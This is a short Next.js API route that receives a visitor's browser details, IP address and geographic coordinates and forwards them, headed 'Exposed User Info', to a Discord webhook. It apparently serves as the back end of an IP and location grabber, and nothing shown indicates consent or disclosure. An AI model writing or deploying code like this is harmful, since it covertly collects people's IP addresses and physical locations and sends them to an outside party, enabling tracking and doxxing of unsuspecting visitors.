import { NextResponse, NextRequest } from "next/server";

export async function POST(request: NextRequest) {
  const req = await request.json();

  if (!req) {
    return NextResponse.json({ message: "Invalid request" }, { status: 400 });
  }

  try {
    const discordWebhookUrl = process.env.DISCORD_WEBHOOK_URL!;
    const details = {
      content: `
**Exposed User Info**
- Browser: ${req.browser}
- IP: ${req.ip}
- Coordinates: ${JSON.stringify(req.coordinates)}
            `,
    };

    await fetch(discordWebhookUrl, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify(details),
    });
  } catch (error) {
    console.error("Error sending data to webhook:", error);
    return NextResponse.json(
      { message: "Error sending data to webhook" },
      { status: 500 }
    );
  }

  const response = NextResponse.json("OK", { status: 200 });

  return response;
}
